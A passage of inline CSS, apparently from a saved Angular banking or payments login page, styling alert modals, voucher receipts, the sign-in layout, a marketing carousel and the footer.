    .avv-alert-error .avv-modal .modal-footer .btn-close.loading span {
      font-size: 14px;
      color: #c3cfe2
    }

    .avv-alert-newerror .avv-modal .modal-footer .btn-close.loading span:before,
    .avv-alert-newnotification .avv-modal .modal-footer .btn-close.loading span:before,
    .avv-alert-cancel .avv-modal .modal-footer .btn-close.loading span:before,
    .avv-alert-exit .avv-modal .modal-footer .btn-close.loading span:before,
    .avv-alert-delete .avv-modal .modal-footer .btn-close.loading span:before,
    .avv-alert-success .avv-modal .modal-footer .btn-close.loading span:before,
    .avv-alert-pending .avv-modal .modal-footer .btn-close.loading span:before,
    .avv-alert-error .avv-modal .modal-footer .btn-close.loading span:before {
      display: none
    }

    .avv-alert-newerror .avv-modal .modal-body .text-center,
    .avv-alert-newnotification .avv-modal .modal-body .text-center,
    .avv-alert-cancel .avv-modal .modal-body .text-center,
    .avv-alert-exit .avv-modal .modal-body .text-center,
    .avv-alert-delete .avv-modal .modal-body .text-center,
    .avv-alert-pending .avv-modal .modal-body .text-center {
      font-size: 14px;
      line-height: 1.71
    }

    .avv-alert-success .avv-modal.voucher.ticket-container {
      position: relative;
      font-size: 0;
      filter: drop-shadow(0 2px 5px rgba(65, 74, 83, .2))
    }

    .avv-alert-success .avv-modal.voucher.ticket-container img.header-image {
      display: none
    }

    .avv-alert-success .avv-modal.voucher.ticket-container .ticket-border {
      width: 100%;
      display: inline-block;
      background: white;
      position: relative;
      background: radial-gradient(transparent 0px, transparent 8px, white 8px, white);
      background-size: 9.33% 100%;
      background-position: 12px -16px;
      overflow: hidden;
      height: 32px
    }

    .avv-alert-success .avv-modal.voucher.ticket-container .ticket-border:after,
    .avv-alert-success .avv-modal.voucher.ticket-container .ticket-border:before {
      content: "";
      position: absolute;
      top: 0;
      right: 0;
      bottom: 0;
      width: 3%;
      background-color: #fff;
      border-radius: 4px
    }

    .avv-alert-success .avv-modal.voucher.ticket-container .ticket-border:after {
      right: 0
    }

    .avv-alert-success .avv-modal.voucher.ticket-container .ticket-border:before {
      left: 0
    }

    .avv-alert-success .avv-modal.voucher .alert-message {
      margin: 16px 0;
      display: flex;
      background-color: #fff1c6;
      border-radius: 4px;
      padding: 8px 10px 8px 8px
    }

    .avv-alert-success .avv-modal.voucher .alert-message span.icon {
      font-size: 16px;
      margin-right: 8px;
      color: #ffb038
    }

    .avv-alert-success .avv-modal.voucher .alert-message p.text {
      font-size: 12px;
      line-height: 1.33;
      font-weight: 400;
      color: #283747;
      margin: 0
    }

    .avv-alert-success .avv-modal.voucher .modal-body>div>div:last-child {
      padding-bottom: 0;
      border-bottom: none
    }

    .avv-alert-success .avv-modal.voucher .modal-body.ticket-content {
      position: relative;
      padding: 0 16px !important;
      background-color: #fff;
      font-size: 16px;
      z-index: 1;
      top: -22px;
      margin-bottom: -44px
    }

    .avv-alert-success .avv-modal.voucher .modal-body .ticket-header {
      display: flex;
      align-items: center;
      justify-content: flex-start;
      margin-bottom: 24px
    }

    .avv-alert-success .avv-modal.voucher .modal-body .ticket-header img {
      margin-right: 1rem;
      width: 72px;
      height: 72px
    }

    .avv-alert-success .avv-modal.voucher .modal-body .ticket-header .ticket-header__content {
      display: flex;
      flex-direction: column
    }

    .avv-alert-success .avv-modal.voucher .modal-body .ticket-header .ticket-header__content__header {
      font-size: 16px;
      line-height: 1.5;
      font-weight: 600;
      color: #2c2c33;
      color: #77899a;
      margin-bottom: 0
    }

    .avv-alert-success .avv-modal.voucher .modal-body .ticket-header .ticket-header__content__title {
      font-size: 16px;
      line-height: 1.5;
      font-weight: 400;
      color: #2c2c33;
      color: #77899a;
      margin-bottom: 0;
      width: 168px
    }

    .avv-alert-success .avv-modal.voucher .modal-body .ticket-header .ticket-header__content__subtitle {
      font-size: 20px;
      line-height: 1.6;
      font-weight: 700;
      color: #2c2c33;
      margin-bottom: 0
    }

    .avv-alert-error .avv-modal.voucher .modal-body>div>div:last-child {
      padding-bottom: 0;
      border-bottom: none
    }

    .modal-crear-contacto-exito[_ngcontent-qmv-c135] .avv-modal-close[_ngcontent-qmv-c135] {
      color: #5c6b7a
    }

    .modal-crear-contacto-exito[_ngcontent-qmv-c135] .avv-modal-header[_ngcontent-qmv-c135] .header-title[_ngcontent-qmv-c135] h5[_ngcontent-qmv-c135] {
      font-size: 16px;
      margin-top: 18px
    }

    .modal-crear-contacto-exito[_ngcontent-qmv-c135] .avv-modal-header[_ngcontent-qmv-c135] .header-title[_ngcontent-qmv-c135] .header-subtitle[_ngcontent-qmv-c135] {
      font-size: 14px
    }

    .modal-crear-contacto-exito[_ngcontent-qmv-c135] .modal-body[_ngcontent-qmv-c135] .ticket-header[_ngcontent-qmv-c135] {
      gap: 10px;
      margin-bottom: 10px
    }

    .modal-crear-contacto-exito[_ngcontent-qmv-c135] .modal-body[_ngcontent-qmv-c135] .avv-modal-body-items[_ngcontent-qmv-c135] .avv-modal-body-item[_ngcontent-qmv-c135] {
      align-items: flex-start
    }

    .voucher-container[_ngcontent-qmv-c135] {
      background-color: #fff;
      width: 350px;
      overflow: hidden;
      padding: 26px 20px 25px;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      position: absolute;
      top: 0;
      left: 0;
      z-index: -1
    }

    .voucher-container[_ngcontent-qmv-c135]:before {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 5px;
      background-image: linear-gradient(269deg, #E1001D 100%, #C30018 2%)
    }

    .voucher-container[_ngcontent-qmv-c135] .logo[_ngcontent-qmv-c135] {
      width: 150px;
      height: 50px
    }

    .voucher-container[_ngcontent-qmv-c135] .ilus-voucher[_ngcontent-qmv-c135] {
      width: 112px;
      height: 112px;
      margin: 1rem 0
    }

    .voucher-container[_ngcontent-qmv-c135] .voucher-title[_ngcontent-qmv-c135] {
      text-align: center
    }

    .voucher-container[_ngcontent-qmv-c135] .voucher-sub-title[_ngcontent-qmv-c135] {
      margin: 5px 0 10px;
      color: #77899a
    }

    .voucher-container[_ngcontent-qmv-c135] .voucher-sub-title[_ngcontent-qmv-c135]>span[_ngcontent-qmv-c135] {
      font-weight: 600
    }

    .voucher-container[_ngcontent-qmv-c135] .voucher-message[_ngcontent-qmv-c135] {
      margin: 20px 0 0;
      text-align: center;
      color: #77899a;
      line-height: 1.43
    }

    .voucher-container[_ngcontent-qmv-c135] ol.list-circle[_ngcontent-qmv-c135] {
      list-style-type: none;
      font-size: 13px;
      line-height: 1.71;
      font-weight: 400;
      padding-left: 1rem;
      margin-top: 2rem !important;
      margin-bottom: 32px !important
    }

    .voucher-container[_ngcontent-qmv-c135] ol.list-circle[_ngcontent-qmv-c135] li[_ngcontent-qmv-c135]:before {
      content: "";
      display: block;
      float: left;
      position: relative;
      top: 8px;
      margin: 0 5px 0 -1rem;
      width: 4px;
      height: 4px;
      background: #E1001D;
      border: 1px solid #E1001D;
      border-radius: 10px
    }

    .voucher-container[_ngcontent-qmv-c135] ol.list-circle[_ngcontent-qmv-c135] li[_ngcontent-qmv-c135]>p[_ngcontent-qmv-c135] {
      text-align: left;
      display: inline-table
    }

    .voucher-container[_ngcontent-qmv-c135] ol.list-circle[_ngcontent-qmv-c135] li[_ngcontent-qmv-c135]>p[_ngcontent-qmv-c135]>.text-dark[_ngcontent-qmv-c135] {
      color: #0048db;
      font-weight: 700
    }

    .voucher-container[_ngcontent-qmv-c135] .voucher-list[_ngcontent-qmv-c135] {
      list-style: none;
      margin: 0;
      padding: 0;
      width: 100%
    }

    .voucher-container[_ngcontent-qmv-c135] .voucher-list[_ngcontent-qmv-c135]>li[_ngcontent-qmv-c135] {
      display: flex;
      justify-content: space-between;
      align-items: center;
      height: 58px;
      border-bottom: solid 1px #C3CFE2
    }

    .voucher-container[_ngcontent-qmv-c135] .voucher-list[_ngcontent-qmv-c135]>li[_ngcontent-qmv-c135] .voucher-description-container[_ngcontent-qmv-c135] {
      text-align: right
    }

    .voucher-container[_ngcontent-qmv-c135] .voucher-list[_ngcontent-qmv-c135]>li[_ngcontent-qmv-c135] p {
      margin: 0
    }

    .voucher-container[_ngcontent-qmv-c135] .voucher-list[_ngcontent-qmv-c135]>li[_ngcontent-qmv-c135] p.voucher-description {
      line-height: 1.43
    }

    .voucher-container[_ngcontent-qmv-c135] .voucher-list[_ngcontent-qmv-c135]>li[_ngcontent-qmv-c135] p.voucher-description img {
      height: 10px;
      width: 10px
    }

    .voucher-container[_ngcontent-qmv-c135] .voucher-list[_ngcontent-qmv-c135]>li.main[_ngcontent-qmv-c135] .voucher-description[_ngcontent-qmv-c135] {
      font-size: 20px;
      font-weight: 600;
      color: #0e199a
    }

    .voucher-container[_ngcontent-qmv-c135] .voucher-list[_ngcontent-qmv-c135]>li.main-with-description[_ngcontent-qmv-c135] .voucher-description[_ngcontent-qmv-c135]:first-child {
      font-size: 16px;
      font-weight: 600;
      color: #0e199a
    }

    .voucher-container[_ngcontent-qmv-c135] .voucher-list[_ngcontent-qmv-c135]>li.main-with-description[_ngcontent-qmv-c135] .voucher-description[_ngcontent-qmv-c135]:last-child {
      font-size: 12px
    }

    .error-items__content[_ngcontent-qmv-c135] {
      padding-bottom: 16px
    }

    .error-items__content[_ngcontent-qmv-c135]:last-child {
      padding-bottom: 0
    }

    .error-items__content__header[_ngcontent-qmv-c135] {
      font-size: 14px;
      line-height: 20px;
      font-weight: 600;
      color: #252b31;
      margin: 0
    }

    .error-items__content__title[_ngcontent-qmv-c135] {
      font-size: 12px;
      line-height: 16px;
      font-weight: 400;
      color: #252b31;
      margin: 0
    }

    .error-items__content__description[_ngcontent-qmv-c135] {
      font-size: 12px;
      line-height: 16px;
      font-weight: 400;
      color: #5c6b7a;
      margin: 0
    }
  </style>
  <style>
    @keyframes arrows {
      0% {
        opacity: 0;
        transform: rotate(45deg) translate(-10px, -10px)
      }

      50% {
        opacity: 1
      }

      to {
        opacity: 0;
        transform: rotate(45deg) translate(0)
      }
    }

    @keyframes spin {
      to {
        transform: rotate(360deg)
      }
    }

    .auth-red-line {
      width: 100%;
      height: 8px;
      background-image: linear-gradient(269deg, #E1001D 100%, #A00104 5%)
    }

    .auth-container {
      width: 100vw;
      height: 100vh;
      display: grid;
      grid-area: container;
      grid-template-columns: 1fr;
      grid-template-rows: 1fr .1fr;
      gap: 0;
      grid-template-areas: "body" "footer";
      grid-auto-flow: dense
    }

    @keyframes gradient-animation-top {
      0% {
        bottom: 67%
      }

      50% {
        bottom: 70%
      }

      to {
        bottom: 67%
      }
    }

    @keyframes gradient-animation-top-xl {
      0% {
        bottom: 45%
      }

      50% {
        bottom: 50%
      }

      to {
        bottom: 45%
      }
    }

    @keyframes gradient-animation-bottom-xl {
      0% {
        top: 45%
      }

      50% {
        top: 30%
      }

      to {
        top: 45%
      }
    }

    @keyframes gradient-animation-bottom-sm {
      0% {
        top: 50%
      }

      50% {
        top: 30%
      }

      to {
        top: 50%
      }
    }

    @keyframes gradient-animation-bottom-lg {
      0% {
        top: 60%
      }

      50% {
        top: 40%
      }

      to {
        top: 60%
      }
    }

    .auth-container_background-top-mobile {
      position: fixed;
      bottom: 45%;
      left: 60%;
      z-index: -1;
      width: 100vh;
      height: 100vh;
      opacity: .4;
      background: radial-gradient(circle farthest-side at center center, #0048DB 0%, #fff 100%);
      overflow: hidden
    }

    .auth-container_background-bottom-mobile {
      position: fixed;
      top: 45%;
      right: 60%;
      z-index: -1;
      width: 100vh;
      height: 100vh;
      opacity: .4;
      background: radial-gradient(circle farthest-side at center center, #E1001D 0%, #fff 100%);
      overflow: hidden
    }

    .auth-container_background-top-desktop {
      position: fixed;
      z-index: -1;
      width: 100vh;
      height: 100vh;
      opacity: .2;
      background: radial-gradient(circle farthest-side at center center, #0048DB 0%, #fff 100%);
      bottom: 67%;
      left: 23%;
      animation: gradient-animation-top 10s ease infinite;
      overflow: hidden
    }

    @media (min-width: 992px) {
      .auth-container_background-top-desktop {
        bottom: 67%;
        left: 23%
      }
    }

    .auth-container_background-bottom-desktop {
      position: fixed;
      z-index: -1;
      top: 55%;
      right: 45%;
      width: 100vw;
      height: 100vw;
      opacity: .2;
      background: radial-gradient(circle farthest-side at center center, #E1001D 0%, #fff 100%);
      animation: gradient-animation-bottom-sm 10s ease infinite;
      overflow: hidden
    }

    @media (min-width: 992px) {
      .auth-container_background-bottom-desktop {
        top: 50%;
        right: 75%;
        animation: gradient-animation-bottom-lg 10s ease infinite
      }
    }

    .auth-container_marketing {
      grid-area: marketing;
      margin: auto;
      background-color: transparent !important
    }

    @media (min-width: 992px) {
      .auth-container_marketing {
        max-width: 450px
      }
    }

    @media (min-width: 1200px) {
      .auth-container_marketing {
        max-width: 600px
      }
    }

    .auth-container_body {
      grid-area: body;
      display: flex;
      align-items: center;
      justify-content: flex-start;
      flex-direction: column
    }

    .auth-container_body-container {
      position: relative;
      margin: 32px 0;
      background: transparent;
      width: 100%;
      max-width: 482px;
      padding: 0 16px
    }

    .auth-container_body-container-logo {
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      margin-bottom: 32px
    }

    .auth-container_body-container-back {
      position: absolute;
      top: -2rem;
      left: 3rem;
      display: flex;
      flex-direction: row;
      justify-content: flex-start;
      align-items: flex-start;
      color: #2c2c33;
      cursor: pointer
    }

    .auth-container_body-container-back .icon {
      width: 16px;
      height: 16px;
      position: absolute;
      display: block;
      font-size: 24px;
      top: 20px;
      right: 16px;
      cursor: pointer
    }

    .auth-container_body-container-back p {
      font-size: 14px;
      font-weight: 600;
      line-height: 1.71;
      margin-bottom: 0
    }

    .auth-container_body-container .icon-cancel {
      width: 16px;
      height: 16px;
      position: absolute;
      display: block;
      top: -10px;
      right: 20px;
      cursor: pointer;
      color: #5c6b7a
    }

    @media (min-width: 768px) {
      .auth-container_body-container .icon-cancel {
        top: 20px
      }
    }

    .auth-container_body-container-header {
      position: relative;
      margin-bottom: 24px
    }

    .auth-container_body-container-header h1 {
      font-size: 18px;
      font-weight: 600;
      line-height: 1.78;
      text-align: center;
      color: #252b31;
      margin-bottom: 0
    }

    .auth-container_body-container-header.register h1 {
      font-size: 18px;
      line-height: 28px;
      font-weight: 400;
      color: #252b31
    }

    .auth-container_body-container-header.register-subtitle h2 {
      font-size: 14px;
      line-height: 20px;
      font-weight: 200;
      color: #252b31
    }

    .auth-container_body-container_content {
      width: 100%
    }

    .auth-container_footer {
      grid-area: footer
    }

    @media (min-width: 768px) {
      .auth-container_body {
        grid-area: body;
        display: flex;
        align-items: center;
        justify-content: center;
        flex-direction: column
      }

      .auth-container_body-container {
        display: flex;
        align-items: center;
        justify-content: center;
        flex-direction: column;
        background-color: #fff;
        max-width: 482px;
        height: 656px;
        margin: 0;
        padding: 60px 50px;
        border-radius: 24px;
        border: 1px solid #DEE1E4;
        box-shadow: 0 3px 9px #c3cfe280
      }

      .auth-container_body-container.register-border {
        border: none;
        box-shadow: none
      }

      .auth-container_body-container-back {
        right: -50px;
        justify-content: flex-end
      }

      .auth-container_body-container-back .icon {
        width: 20px;
        height: 20px;
        top: -2px;
        right: 52px
      }
    }

    @media (min-width: 992px) {
      .auth-container {
        display: grid;
        grid-area: container;
        grid-template-columns: 1.2fr .8fr;
        grid-template-rows: 2fr .3fr;
        gap: 0;
        grid-template-areas: "marketing body" "footer body";
        grid-auto-flow: dense
      }

      .auth-container_body-container {
        height: 756px
      }

      .auth-container_body-container.register-border {
        border: 1px solid #DEE1E4;
        box-shadow: 0 3px 9px #c3cfe280
      }

      .auth-container_body-container-back {
        top: 1.5rem;
        right: 1.5rem;
        justify-content: flex-end
      }
    }
  </style>
  <style>
    @keyframes _ngcontent-qmv-c28_arrows {
      0% {
        opacity: 0;
        transform: rotate(45deg) translate(-10px, -10px)
      }

      50% {
        opacity: 1
      }

      to {
        opacity: 0;
        transform: rotate(45deg) translate(0)
      }
    }

    @keyframes _ngcontent-qmv-c28_spin {
      to {
        transform: rotate(360deg)
      }
    }

    .marketing-carousel-container[_ngcontent-qmv-c28] {
      position: relative;
      display: flex;
      align-items: center;
      justify-content: flex-start;
      flex-direction: column;
      height: 100%
    }

    .marketing-carousel-container_slides[_ngcontent-qmv-c28] {
      height: 100%
    }

    .marketing-carousel-container_bullets[_ngcontent-qmv-c28] {
      bottom: -5px;
      display: block;
      transform: none;
      left: 0;
      position: absolute
    }

    .marketing-carousel-container[_ngcontent-qmv-c28] .glide__bullets[_ngcontent-qmv-c28] .glide__bullet[_ngcontent-qmv-c28] {
      width: 10px;
      height: 10px;
      margin-right: 12px;
      margin-left: 0;
      border: none;
      background-color: #dbe2e8;
      box-shadow: none
    }

    .marketing-carousel-container[_ngcontent-qmv-c28] .glide__bullets[_ngcontent-qmv-c28] .glide__bullet[_ngcontent-qmv-c28]:last-child {
      margin-right: 0
    }

    .marketing-carousel-container[_ngcontent-qmv-c28] .glide__bullets[_ngcontent-qmv-c28] .glide__bullet--active[_ngcontent-qmv-c28] {
      border-radius: 6px;
      background-color: #0048db
    }
  </style>
  <style>
    @keyframes _ngcontent-qmv-c26_arrows {
      0% {
        opacity: 0;
        transform: rotate(45deg) translate(-10px, -10px)
      }

      50% {
        opacity: 1
      }

      to {
        opacity: 0;
        transform: rotate(45deg) translate(0)
      }
    }

    @keyframes _ngcontent-qmv-c26_spin {
      to {
        transform: rotate(360deg)
      }
    }

    .avv-footer-container[_ngcontent-qmv-c26] {
      padding: 1rem 1rem 8px
    }

    .avv-footer-container.login[_ngcontent-qmv-c26] {
      background-color: transparent
    }

    .avv-footer-container.marketplace[_ngcontent-qmv-c26],
    .avv-footer-container.app[_ngcontent-qmv-c26],
    .avv-footer-container.pse[_ngcontent-qmv-c26],
    .avv-footer-container.user-does-not-exist[_ngcontent-qmv-c26] {
      background-color: #fff
    }

    .avv-footer-container.pse[_ngcontent-qmv-c26]:before,
    .avv-footer-container.user-does-not-exist[_ngcontent-qmv-c26]:before {
      content: "";
      position: absolute;
      top: 0;
      width: 90%;
      border: 1px solid #8E9BA9
    }

    .avv-footer-container[_ngcontent-qmv-c26] .description[_ngcontent-qmv-c26] {
      display: flex;
      flex-direction: row;
      justify-content: space-between;
      font-size: 11px;
      line-height: 1.45
    }

    .avv-footer-container[_ngcontent-qmv-c26] .description.login[_ngcontent-qmv-c26] {
      color: #252b31
    }

    .avv-footer-container[_ngcontent-qmv-c26] .description.general[_ngcontent-qmv-c26],
    .avv-footer-container[_ngcontent-qmv-c26] .description.pse[_ngcontent-qmv-c26],
    .avv-footer-container[_ngcontent-qmv-c26] .description.user-does-not-exist[_ngcontent-qmv-c26],
    .avv-footer-container[_ngcontent-qmv-c26] .description.marketplace[_ngcontent-qmv-c26],
    .avv-footer-container[_ngcontent-qmv-c26] .description.app[_ngcontent-qmv-c26] {
      color: #2c2c33
    }

    .avv-footer-container[_ngcontent-qmv-c26] .description[_ngcontent-qmv-c26] p[_ngcontent-qmv-c26] {
      margin-bottom: 0;
      line-height: 1.5
    }

    .avv-footer-container[_ngcontent-qmv-c26] .description-logo[_ngcontent-qmv-c26],
    .avv-footer-container[_ngcontent-qmv-c26] .description-logo[_ngcontent-qmv-c26] img.logo-super[_ngcontent-qmv-c26],
    .avv-footer-container[_ngcontent-qmv-c26] .description-logo[_ngcontent-qmv-c26] img.logo-aval[_ngcontent-qmv-c26] {
      display: none
    }

    .avv-footer-container[_ngcontent-qmv-c26] .description-info[_ngcontent-qmv-c26] {
      display: flex;
      flex-direction: column;
      width: 100%
    }

    .avv-footer-container[_ngcontent-qmv-c26] .description-info-line[_ngcontent-qmv-c26] {
      margin-bottom: 5px
    }

    .avv-footer-container[_ngcontent-qmv-c26] .description-info-line[_ngcontent-qmv-c26] p.login[_ngcontent-qmv-c26] {
      font-weight: 700;
      font-size: 12px
    }

    .avv-footer-container[_ngcontent-qmv-c26] .description-info-line[_ngcontent-qmv-c26] p.general[_ngcontent-qmv-c26],
    .avv-footer-container[_ngcontent-qmv-c26] .description-info-line[_ngcontent-qmv-c26] p.pse[_ngcontent-qmv-c26],
    .avv-footer-container[_ngcontent-qmv-c26] .description-info-line[_ngcontent-qmv-c26] p.user-does-not-exist[_ngcontent-qmv-c26],
    .avv-footer-container[_ngcontent-qmv-c26] .description-info-line[_ngcontent-qmv-c26] p.marketplace[_ngcontent-qmv-c26],
    .avv-footer-container[_ngcontent-qmv-c26] .description-info-line[_ngcontent-qmv-c26] p.app[_ngcontent-qmv-c26] {
      font-weight: 600
    }

    .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] {
      display: flex;
      flex-direction: row;
      align-content: center;
      align-items: center;
      justify-content: space-between;
      width: 100%
    }

    .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] img.logo-aval[_ngcontent-qmv-c26] {
      display: none
    }

    .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .text[_ngcontent-qmv-c26] .city-name.login[_ngcontent-qmv-c26] {
      font-size: 12px
    }

    .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .text[_ngcontent-qmv-c26] p.login[_ngcontent-qmv-c26] {
      font-weight: 700
    }

    .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .text[_ngcontent-qmv-c26] p.general[_ngcontent-qmv-c26],
    .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .text[_ngcontent-qmv-c26] p.pse[_ngcontent-qmv-c26],
    .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .text[_ngcontent-qmv-c26] p.user-does-not-exist[_ngcontent-qmv-c26],
    .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .text[_ngcontent-qmv-c26] p.marketplace[_ngcontent-qmv-c26],
    .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .text[_ngcontent-qmv-c26] p.app[_ngcontent-qmv-c26] {
      font-weight: 600
    }

    .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .text[_ngcontent-qmv-c26] p[_ngcontent-qmv-c26]:last-child {
      font-weight: 400
    }

    .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .text.tablet[_ngcontent-qmv-c26] {
      display: none
    }

    .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider[_ngcontent-qmv-c26] {
      height: 24px;
      align-self: center;
      margin: 0 8px
    }

    .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider.login[_ngcontent-qmv-c26] {
      border-left: 1px solid #252B31
    }

    .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider.general[_ngcontent-qmv-c26],
    .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider.pse[_ngcontent-qmv-c26],
    .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider.user-does-not-exist[_ngcontent-qmv-c26],
    .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider.marketplace[_ngcontent-qmv-c26],
    .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider.app[_ngcontent-qmv-c26] {
      border-left: 1px solid #dbe2e8
    }

    .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider.tablet[_ngcontent-qmv-c26] {
      display: none
    }

    .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .text-cities[_ngcontent-qmv-c26] {
      display: flex;
      flex-direction: row;
      align-items: center
    }

    .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .text-cities.login[_ngcontent-qmv-c26] {
      color: #252b31
    }

    .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .text-cities.general[_ngcontent-qmv-c26],
    .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .text-cities.pse[_ngcontent-qmv-c26],
    .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .text-cities.user-does-not-exist[_ngcontent-qmv-c26],
    .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .text-cities.marketplace[_ngcontent-qmv-c26],
    .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .text-cities.app[_ngcontent-qmv-c26] {
      color: #0048db
    }

    .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .text-cities[_ngcontent-qmv-c26] p[_ngcontent-qmv-c26] {
      text-decoration: underline
    }

    .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .text-cities[_ngcontent-qmv-c26] .form-icon[_ngcontent-qmv-c26] {
      font-size: 24px
    }

    .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .text-cities[_ngcontent-qmv-c26] .form-icon.opened[_ngcontent-qmv-c26] {
      transform: rotate(180deg);
      transition: transform .3s linear
    }

    .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .text-cities[_ngcontent-qmv-c26] .form-icon.closed[_ngcontent-qmv-c26] {
      transform: rotate(0);
      transition: transform .3s linear
    }

    .avv-footer-copyright[_ngcontent-qmv-c26] {
      display: flex;
      flex-direction: column;
      justify-content: center;
      height: 60px
    }

    .avv-footer-copyright.marketplace[_ngcontent-qmv-c26],
    .avv-footer-copyright.app[_ngcontent-qmv-c26] {
      height: 0
    }

    .avv-footer-copyright.login[_ngcontent-qmv-c26] {
      background: transparent;
      color: #252b31
    }

    .avv-footer-copyright.general[_ngcontent-qmv-c26],
    .avv-footer-copyright.pse[_ngcontent-qmv-c26],
    .avv-footer-copyright.user-does-not-exist[_ngcontent-qmv-c26] {
      background: #F1F3F6;
      color: #2c2c33
    }

    .avv-footer-copyright[_ngcontent-qmv-c26] .info[_ngcontent-qmv-c26] {
      display: none
    }

    .avv-footer-copyright[_ngcontent-qmv-c26] .logo[_ngcontent-qmv-c26] {
      display: flex;
      flex-direction: row;
      justify-content: space-between;
      align-items: center;
      padding: 16px
    }

    .avv-footer-copyright[_ngcontent-qmv-c26] .logo.opened[_ngcontent-qmv-c26] {
      padding: 0 16px
    }

    .avv-footer-copyright[_ngcontent-qmv-c26] .logo[_ngcontent-qmv-c26] img.logo-aval[_ngcontent-qmv-c26] {
      width: 70px;
      height: 20px
    }

    .avv-footer-copyright[_ngcontent-qmv-c26] .logo[_ngcontent-qmv-c26] img.logo-vigilado[_ngcontent-qmv-c26] {
      width: 132px;
      height: 12px
    }

    .avv-footer-copyright.opened[_ngcontent-qmv-c26] {
      height: 150px
    }

    .avv-footer-copyright.opened.marketplace[_ngcontent-qmv-c26],
    .avv-footer-copyright.opened.app[_ngcontent-qmv-c26] {
      height: 100px
    }

    .avv-footer-copyright.opened[_ngcontent-qmv-c26] .info[_ngcontent-qmv-c26] {
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      align-items: flex-start;
      padding: 1rem;
      font-size: 11px;
      line-height: 1.45;
      height: 110px
    }

    .avv-footer-copyright.opened[_ngcontent-qmv-c26] .info[_ngcontent-qmv-c26] p[_ngcontent-qmv-c26] {
      margin-bottom: 8px
    }

    .avv-footer-copyright.opened[_ngcontent-qmv-c26] .info[_ngcontent-qmv-c26] p[_ngcontent-qmv-c26] span.login[_ngcontent-qmv-c26] {
      font-size: 12px;
      font-weight: 700
    }

    .avv-footer-copyright.opened[_ngcontent-qmv-c26] .info[_ngcontent-qmv-c26] p[_ngcontent-qmv-c26] span.general[_ngcontent-qmv-c26],
    .avv-footer-copyright.opened[_ngcontent-qmv-c26] .info[_ngcontent-qmv-c26] p[_ngcontent-qmv-c26] span.pse[_ngcontent-qmv-c26],
    .avv-footer-copyright.opened[_ngcontent-qmv-c26] .info[_ngcontent-qmv-c26] p[_ngcontent-qmv-c26] span.user-does-not-exist[_ngcontent-qmv-c26],
    .avv-footer-copyright.opened[_ngcontent-qmv-c26] .info[_ngcontent-qmv-c26] p[_ngcontent-qmv-c26] span.marketplace[_ngcontent-qmv-c26],
    .avv-footer-copyright.opened[_ngcontent-qmv-c26] .info[_ngcontent-qmv-c26] p[_ngcontent-qmv-c26] span.app[_ngcontent-qmv-c26] {
      font-weight: 700
    }

    .avv-footer-copyright.opened[_ngcontent-qmv-c26] .logo[_ngcontent-qmv-c26] {
      height: 60px
    }

    @media (min-width: 576px) {
      .avv-footer-container.login[_ngcontent-qmv-c26] {
        background-color: transparent
      }

      .avv-footer-container.general[_ngcontent-qmv-c26],
      .avv-footer-container.pse[_ngcontent-qmv-c26],
      .avv-footer-container.user-does-not-exist[_ngcontent-qmv-c26] {
        background-color: #f1f3f6
      }

      .avv-footer-container[_ngcontent-qmv-c26]:before {
        content: none !important
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description[_ngcontent-qmv-c26] {
        align-items: flex-end
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description[_ngcontent-qmv-c26] .logo-super[_ngcontent-qmv-c26] {
        height: 118px;
        margin-right: 24px
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] {
        align-items: flex-end
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .text-cities[_ngcontent-qmv-c26] {
        display: none
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .text.tablet[_ngcontent-qmv-c26] {
